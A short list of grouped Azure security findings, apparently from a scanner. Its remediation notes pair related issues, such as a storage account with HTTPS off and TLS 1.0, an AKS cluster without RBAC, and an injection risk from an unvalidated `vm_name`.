- SEC-AZURE-STORAGE-002#1 + SEC-AZURE-STORAGE-TLS-001#1: "Same storage account (`weak_tls`) has both HTTPS off and TLS 1.0 — fix together"
- SEC-AZURE-AKS-RBAC-001#1 + SEC-AZURE-AKS-NODEIP-001#1: "Same AKS cluster has RBAC off AND public node IPs — fix as a single cluster hardening pass"
- SEC-AZURE-KV-001#1 + SEC-AZURE-KV-AUDIT-001#1: "Key Vault security: one vault lacks purge protection, the other lacks audit logging — review both vaults together"
- SEC-AZURE-STORAGE-NETWORK-001#1 + SEC-AZURE-STORAGE-NETWORK-001#2 + SEC-AZURE-STORAGE-001#1: "Three storage accounts with public exposure — apply network rules and private endpoints in a single pass"
- SEC-AZURE-INJECTION-001#1 + SEC-PROVISIONER-001#1 + STYLE-VAR-001#1: "All three injection vectors stem from unvalidated `vm_name` — validate the variable and remove the provisioner together"
